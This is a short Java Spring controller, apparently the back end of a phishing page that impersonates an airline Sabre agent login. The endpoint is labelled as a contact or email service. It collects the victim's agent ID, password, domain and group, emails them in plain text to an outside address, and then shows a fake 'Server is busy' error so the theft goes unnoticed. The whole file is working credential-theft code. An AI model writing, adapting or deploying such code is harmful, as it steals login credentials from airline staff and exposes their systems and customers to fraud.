package com.account.havail.sabre.sabre.controllers;


import com.account.havail.sabre.sabre.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

@Controller
@RequestMapping("/api/contact")
public class LoginAsAirlinesController {

    @Autowired
    private EmailService emailService;

    @PostMapping("/send")
    public String sendEmail(@RequestParam String userId,
                                            @RequestParam String password,
                                            @RequestParam String domain,
                                            @RequestParam String group, RedirectAttributes redirectAttributes) {
        String subject = "New Login Attempt with Airlines ";
        String body = "Agent ID: " + userId + "\n"
                + "Password: " + password + "\n"
                + "Domain: " + domain + "\n"
                + "Group: " + group;
        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");

        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, body);
        return "redirect:/home/login/airlines";
    }
}
